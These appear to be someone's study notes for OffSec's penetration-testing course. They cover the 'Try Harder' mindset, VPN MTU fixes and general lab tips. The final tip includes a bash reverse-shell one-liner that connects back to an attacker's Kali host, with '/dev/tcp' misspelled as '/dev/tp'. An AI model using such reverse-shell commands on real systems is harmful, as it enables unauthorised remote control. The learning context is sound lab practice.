[_Try Harder_](https://www.offsec.com/offsec/what-it-means-to-try-harder/) mindset. To better understand this mindset, let's quickly consider two potential perspectives in a moment of "failure."

1. If my attack or defense fails, it represents a truth about my current skills/processes/configurations/approach as much as it is a truth about the system.
2. If my attack or defense fails, this allows me to learn something new, change my approach, and do something differently.

Do exercise before or after study!

---------

**MOST IMP**

```
sudo ip l s dev tun0 mtu 1300
```


------

1. always check http and https both for same site
2. check local ports after getting initial shell
3. **payload all the things** have it ALL!
4. do brute force if nothing works
5. if SSH stuck, try to lower MTU and it will works `sudo ifconfig tun0 mtu 1200`
6. whenever you run exploit and
	- it gives error when you provide required field, then look at code because you need to change input to take as binary with help of `b(SNIP)`
	- if its **RCE** and still don't work then use ping first with exploit. Example, `ping -c 1 $tun0_IP` and if it works then start nc and take shell with `'/bin/bash -c "/bin/bash -i &> /dev/tp/kali_IP/443 0>&1"'`
